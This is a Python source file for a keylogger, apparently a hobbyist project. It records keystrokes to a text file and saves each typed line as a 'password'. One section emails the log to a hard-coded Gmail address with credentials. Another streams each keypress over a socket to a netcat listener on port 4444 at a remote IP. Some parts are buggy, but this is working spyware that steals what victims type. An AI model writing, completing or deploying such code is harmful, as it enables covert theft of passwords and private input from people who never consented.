# ===================================================== Basic keylogger ================================================


import keyboard

# Defining the text file name and path
path = "keysniffer_data.txt"

while True:
    with open(path, "a") as data_file:

        # All key presses are recorded as a list into "events"
        # and the record loop stops when the "enter" key is pressed
        events = keyboard.record("enter")
        password = list(keyboard.get_typed_strings(events))

        data_file.write("\n")  # New line written before data is written
        data_file.write(password[0])


# ===================================================== Filtering data =======================================================


# import json
# import os


# def filter_data(data, criteria):
#    return [item for item in data if all(item.get(k) == v for k, v in criteria.items())]


# def read_data_from_file(file_path):
#      if not os.path.exists(file_path):
#        raise FileNotFoundError(f"File {file_path} not found.")
#    with open(file_path, "r") as file:
#        return [json.loads(line) for line in file]


# def save_data_to_file(data, file_path):
#    with open(file_path, "w") as file:
#        file.writelines(json.dumps(item) + "\n" for item in data)


# Paths
# data_file_path = "data.txt"
# output_file_path = "filtered_results.txt"

# Filter and save
# example_data = read_data_from_file(data_file_path)
# criteria = {"age": 30, "city": "New York"}
# filtered_results = filter_data(example_data, criteria)
# save_data_to_file(filtered_results, output_file_path)

# print(f"Filtered results saved to {output_file_path}")


# ===================================================== Sending by email =========================================================


# this code was tacken from : https://www.geeksforgeeks.org/send-mail-attachment-gmail-account-using-python/?ref=lbp

# Python code to illustrate Sending mail with attachments
# from your Gmail account

# libraries to be imported
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


fromaddr = "7unkym0nk3y@gmail.com"
toaddr = "7unkym0nk3y@gmail.com"

# instance of MIMEMultipart
msg = MIMEMultipart()

# storing the senders email address
msg["From"] = fromaddr

# storing the receivers email address
msg["To"] = toaddr

# storing the subject
msg["Subject"] = "test"

# string to store the body of the mail
body = "Body_of_the_mail"

# attach the body with the msg instance
msg.attach(MIMEText(body, "plain"))

# open the file to be sent
filename = "File_name_with_extension"
attachment = open("keysniffer_data.txt", "rb")

# instance of MIMEBase and named as p
p = MIMEBase("application", "octet-stream")

# To change the payload into encoded form
p.set_payload((attachment).read())

# encode into base64
encoders.encode_base64(p)

p.add_header("Content-Disposition", "attachment; filename= %s" % filename)

# attach the instance 'p' to instance 'msg'
msg.attach(p)

# creates SMTP session
s = smtplib.SMTP("7unkym0nk3y@gmail.com", 587)

# start TLS for security
s.starttls()

# Authentication
s.login(fromaddr, "Test..123")

# Converts the Multipart msg into a string
text = msg.as_string()

# sending the mail
s.sendmail(fromaddr, toaddr, text)

# terminating the session
s.quit()


# ===================================================== Taking screenshots =======================================================


# ===================================================== Typing live ==============================================================


import socket

# Netcat server details
nc_host = "10.0.97.0"  # Replace with your netcat listener IP
nc_port = 4444  # Replace with your netcat listener port


def send_key_to_netcat(key):
    try:
        # It opens a network socket using socket.socket() to communicate with the Netcat server and tries to connect using the server information
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((nc_host, nc_port))

            # If the key has a printable character (key.char exists), it is encoded and sent to the server (normal keys)
            if hasattr(key, "char") and key.char:
                s.sendall(key.char.encode())

            # If the key is a space (keyboard.Key.space), a space character is sent (space)
            elif key == keyboard.Key.space:
                s.sendall(b" ")

            # If the key is a special key (e.g., Shift, Ctrl), its name (e.g., [Key.shift]) is sent. (special keys)
            else:
                s.sendall(f" [{key}] ".encode())

    # If there’s any issue (e.g., the server is unreachable), it prints an error message.
    except Exception as e:
        print(f"Error: {e}")


# Callback function for key press --> each time a key is pressed it will send it to netcat in the kali linux machine
def on_press(key):
    send_key_to_netcat(key)


print("Keylogger is running... Press Ctrl+C to stop.")

# Start the listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
